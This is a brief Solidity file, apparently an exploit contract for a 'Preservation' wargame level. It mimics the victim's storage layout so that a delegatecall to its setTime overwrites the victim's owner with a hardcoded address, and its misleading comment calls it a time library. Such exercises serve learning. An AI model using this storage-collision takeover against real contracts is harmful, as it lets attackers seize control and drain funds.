// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

// Simple library contract to set the time
contract HackPreservation {
  // public library contracts 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  function getuint(address hacker) public view returns (uint) {
    return uint(hacker);
  }

  function setTime(uint _time) public {
    owner = 0x87Fa1091e58bA7D993F63Bb31f6CB08305eCD4e2;
  }
}